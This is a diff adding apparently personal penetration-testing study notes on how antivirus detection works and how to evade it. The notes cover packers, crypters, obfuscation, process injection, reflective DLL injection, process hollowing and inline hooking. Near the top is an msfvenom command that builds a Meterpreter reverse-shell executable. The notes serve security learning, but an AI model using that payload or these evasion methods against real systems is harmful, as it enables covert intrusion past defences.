@@ -1,0 +1,78 @@
+------------------
+NOTES
+------------------
+
+AV Detection Methods
+	create a simple msfvenom payload and plop it in virus total or something
+		msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f exe > binary.exe
+	will get light up like a got damn crimbus tree
+
+	Signature based
+		sequences of bytes within malware that are unique
+		blacklist technology
+			constantly scans for known sigs and if any are found it quarantines the files ( renders them unusable )
+		Can bypass sig based detection by obfuscating the contents of a malicious file
+		Super EZ case, change strings from upper to lower case or something
+		Each vendor is different, creating bypasses can be a trail-and-error in lab env
+		part of the pentest is then finding out the type of AV/EDR and its version, etc
+	Heuristic-Based Detection
+		relies on various rules and algorithms to determine wheter or not an action is malicious
+		stepping through instructions of a binary file or trying to decompile and analyze a file
+	Behabiour-Based Detection
+		dynamically analyzes the behavior of a binary
+		executed in a small VM or contianer
+	Good AV will use a combo of all types
+
+Bypassing AV
+	two main categories
+		On Disk
+			focuses on modifying files physically stored on the disk
+			Packers
+				originally used to decrease the size of an executeable
+				resulting files have a new sig that are functionally identitcal
+				use of UPX and other popular packing tools are not sufficient
+			Obfuscators
+				reorganize and mutate code to make reversing quite difficult
+				replacing insturctions with semantically equivalent
+				inserting irrlevent "dead code" instructions
+				splitting or reordering functions
+			Cypters
+				cryptographically alters executable code
+				add a decrypting stub that restores the original code when executed
+				decryption happens in Memory
+				on encrypted code is left on disk
+			Software Protectors
+				effective techniques combine all of these together
+					as well as anti-reversing, anti-debugging, vm emulation detection
+				complex and few free tools
+					one that is worthwhile Enigma Protector (http://www.enigmaprotector.com/en/home.html)
+
+		In-Memory
+			most common as AV disk scanning is mature
+			also known as PE injection
+			manipulates in motion memory
+			does not write any files to disk
+
+			Remote process memory injection
+				inject a payload into another valid PE that is not malicious
+				leverages a set of Windows APIs
+					OpenProcess to create a valid HANDLE to target a process we have permission to
+					Allocate memory in the context of the processs with VirtualAllocEx
+					copy the malicious payload to the newly allocatred memory using WriteProcessMemory
+					execute payload in a different thread in CreateRemoteThread
+
+				Reflective DLL Injection
+					unlike normal DLL injection which loads a DLL from disk and uses LoadLibrary APIs
+					need to write their own version of the API that does not rely on a disk-based DLL
+					https://www.andreafortuna.org/2017/12/08/what-is-reflective-dll-injection-and-how-can-be-detected/
+
+				Process Hollowing
+					launch a non malicious process in a suspended state
+					remove the image of the process from memory nad replace it with a malicious exe image
+					process is resumed and malicious code is executed instead of the legit process
+					https://ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations ↩︎
+
+				Inline hooking
+					modifying memory and introduce a hook into a function to point the execution flow to malicious code
+						hook = instructions that redirect the code execution
+					flow will return back to the modified function and resume execution
